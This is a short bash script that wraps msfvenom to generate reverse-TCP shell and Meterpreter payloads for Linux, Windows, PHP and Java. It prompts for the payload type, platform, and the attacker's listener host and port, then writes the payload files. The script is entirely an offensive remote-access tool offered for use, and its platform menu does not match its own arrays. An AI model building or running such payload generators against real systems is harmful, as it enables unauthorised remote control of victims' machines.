#!/bin/bash

plat=("linux" "linux" "windows" "windows" "java" "php")
typ=("shell/reverse_tcp" "shell_reverse_tcp" "meterpreter/reverse_tcp" "meterpreter_reverse_tcp")
arch=("x86" "x64" "x86" "x64" "raw" "jsp")
out=("elf" "elf" "exe" "exe" "php" "jsp")

echo "Enter the type of payload you want "
echo "0. Staged Non-Meterpreter"
echo "1. Stageless Non-Meterpreter"
echo "2. Staged Meterpreter"
echo "3. Stageless Meterpreter"

read typo

echo "Select Platform"
echo "0. Linux x86"
echo "1. Linux x64"
echo "2. Windows x86"
echo "3. Windows x64"
echo "4. PHP"
echo "5. Java"
read platform

read -p "Enter Listener Host :" host
read -p "Enter Listener Port :" port

echo "You Payload is Preparing "

if [ $platform -eq 2 ]
then

	pay=${plat[$platform]}"/"${typ[$typo]}
	
elif [ $platform -eq 4 ] && [ $typo -eq 0 ]
then
	msfvenom -p php/reverse_php LHOST=$host LPORT=$port -f raw -o shell.php
	exit

elif [ $platform -eq 4 ] && [ $typo -eq 2 ]
then
	msfvenom -p php/meterpreter_reverse_tcp LHOST=$host LPORT=$port -f raw > shell.php
	exit

else
	pay=${plat[$platform]}"/"${arch[$platform]}"/"${typ[$typo]}

fi

msfvenom -p $pay LHOST=$host LPORT=$port -f ${out[$platform]} -o shell.${out[$platform]}
